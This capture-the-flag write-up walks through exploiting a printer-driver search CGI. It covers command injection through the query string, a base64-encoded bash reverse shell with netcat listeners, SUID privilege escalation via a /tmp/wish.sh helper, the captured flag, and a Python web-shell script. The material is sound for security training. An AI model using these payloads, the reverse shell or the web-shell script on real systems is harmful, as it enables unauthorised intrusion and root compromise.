## Chall description
```
I found this printer on the network, and it seems to be running... a weird web page... to search for drivers?
Here is some of the code I could dig up.
Note: Escalate your privileges and uncover the flag in the root user's home directory.

The password to the ZIP archive below is phasing_through_printers.
```

## Procedure

```c
int main ()
{
   char *env_value;
   char *save_env;

   printf("Content-type: text/html\n\n");
   save_env = getenv("QUERY_STRING"); 
   if (strncmp(save_env, "q=", 2) == 0) {
        memmove(save_env, save_env + 2, strlen(save_env + 2) + 1);
      
    }

   char *decoded = (char *)malloc(strlen(save_env) + 1);

   urldecode2(decoded, save_env);


   char first_part[] = "grep -R -i ";
   char last_part[] = " /var/www/html/data/printer_drivers.txt" ;
   size_t totalLength = strlen(first_part) + strlen(last_part) + strlen(decoded) + 1;
   char *combinedString = (char *)malloc(totalLength);
   if (combinedString == NULL) {
        printf("Failed to allocate memory");
        return 1;
   }
   strcpy(combinedString, first_part);
   strcat(combinedString, decoded);
   strcat(combinedString, last_part);
   FILE *fp;
   char buffer[1024];

   fp = popen(combinedString, "r");
   if (fp == NULL) {
      printf("Error running command\n");
      return 1;
   }
   while (fgets(buffer, sizeof(buffer), fp) != NULL) {
      printf("%s<br>", buffer);
   }

   pclose(fp);

   fflush(stdout);
   free(combinedString);
   free(decoded);
   exit (0);
}
```
### main function summary
* CGI program reads QUERY_STRING `q`, URL-decodes it, and runs `grep -R -i <input> /var/www/html/data/printer_drivers.txt` via popen.
* User input is concatenated into a shell command without escaping, this can allow `Code Injection`.
* Look for popen/system, confirm `QUERY_STRING` handling, we can send this payload ` ; id ;`.

Trying with payload `;id;`, we can see the execution of our payload
```bash
## payload ;id;

## Output
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can try to get a [revshell](https://www.revshells.com), we started listening on port `1337` with `nc -lnvp 1337`, and then try to call our revshell, but this did'nt work 🤔, the web got freeze.
```bash
## payload ;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdWRwL2lwLzEzMzcgMD4mMQ==|base64 -d|bash;
```
<img width="1348" height="266" alt="Screenshot 2025-10-15 at 10 12 21 AM" src="https://github.com/user-attachments/assets/0b776c71-7ca4-41c8-a90e-e82471508108" />

But why this happened, I was playing a little with curl, and we can see a fetch on `80, 443` ports 👀, this can be a firewall rules that allow only outgoing traffic for `80` and `443` ports 🤔.

<img width="1549" height="818" alt="Screenshot 2025-10-15 at 10 14 02 AM" src="https://github.com/user-attachments/assets/21c56d6f-fc6b-4da1-9de0-0ee31881f103" />

After confirm our theory, we can start our shell with `nc -lnvp 80`, you will need a public IP for this. We have our revshell 😃
```bash
Listening on 0.0.0.0 80
Connection received on 3.225.222.31 1407
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/usr/lib/cgi-bin
```
The chall talks about privilege escalation, we can use `find` to get binaries with `SUID` permission, with command `find / -perm /4000 -type f 2>/dev/null`.
```bash
find / -perm /4000 -type f 2>/dev/null
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/local/bin/admin_help
```

We can see `/usr/local/bin/admin_help`, after download and recover the code, this is trying to open `/tmp/wish.sh`, set execution permission and then try to execute with `sudo` permission.
```c

int32_t system(char const* line)
{
    /* tailcall */
    return system(line);
}
int32_t setuid(uid_t uid)
{
    /* tailcall */
    return setuid(uid);
}


int32_t main(int32_t argc, char** argv, char** envp)
{
    int32_t rbx = 4;
    setuid(geteuid());
    puts("Your wish is my command... maybe :)");
    
    while (true)
    {
        if (!removeStringFromFile("sh"))
        {
            puts("Bad String in File.");
            break;
        }
        
        int32_t temp0_1 = rbx;
        rbx -= 1;
        
        if (temp0_1 == 1)
        {
            system("chmod +x /tmp/wish.sh && /tmp/wish.sh");
            break;
        }
    }
    
    return 0;
}


int64_t removeStringFromFile(char* arg1)
{
    int64_t filename;
    __builtin_strcpy(&filename, "/tmp/wish.sh");
    FILE* fp = fopen(&filename, "r");
    
    if (!fp)
        perror("Error opening original file");
    else
    {
        char* i;
        
        do
        {
            char buf[0x400];
            
            if (!fgets(&buf, 0x400, fp))
            {
                fclose(fp);
                return 1;
            }
            
            i = strstr(&buf, arg1);
        } while (!i);
    }
    
    return 0;

}
```

the `/tmp/wish.sh` doesn't exist, we can create the file and try to call `/usr/local/bin/admin_help` to recover the flag.

```bash
echo 'cat /root/flag.txt' > /tmp/wish.sh
cd /usr/local/bin/          
./admin_help

## Output
flag{93541544b91b7d2b9d61e90becbca309}Your wish is my command... maybe :)
```

Flag: `flag{93541544b91b7d2b9d61e90becbca309}`

### Alternative solution
You dont need the revshell to recover the flag, just playing a little, I have created a python script just to send our commands easy.

```python
import requests

target_url = input("target url: ")
token = input("token: ")

command = ''
while command!='exit':
    command = input("sp34rsh3ll $: ")
    if command=='exit':
        break 

    try:
        headers = {
            "Cookie":f"token={token}"
        }
        res = requests.get(target_url+'/cgi-bin/search.cgi?q=;'+command+';',headers=headers)
        print(res.text)
    except:
        pass
```


<img width="1472" height="214" alt="Screenshot 2025-10-15 at 4 41 39 PM" src="https://github.com/user-attachments/assets/4f19a047-a7d3-4312-afe6-98d84b5a3251" />







